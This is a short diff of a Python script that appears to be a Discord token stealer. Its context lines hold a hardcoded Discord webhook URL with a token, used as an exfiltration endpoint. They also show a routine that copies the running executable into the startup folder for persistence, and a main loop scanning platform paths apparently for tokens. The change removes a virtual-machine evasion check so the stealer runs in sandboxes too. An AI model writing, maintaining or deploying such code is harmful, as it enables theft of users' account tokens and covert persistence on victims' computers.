@@ -14,8 +14,6 @@ import os
 import sys
 import platform
 import subprocess
-import psutil
-import time
 import ctypes
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1467646691254734849/25KapUDT_ofrX2vhLanLFpLKHfR4indE5Xv4gi2Z4WPXvSio0ERBeaWo6fqxY_meCluo"
@@ -128,7 +126,7 @@ def copy_exe_to_startup(exe_path):
 
 exe_path = os.path.abspath(sys.argv[0])
 copy_exe_to_startup(exe_path)
-                
+
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -365,9 +363,6 @@ def delete_file(file_path):
         os.remove(file_path)
 
 def main():
-    if not vm_bypass():
-        return
-    
     checked = []
     for platform_name, path in PATHS.items():
         if not os.path.exists(path):
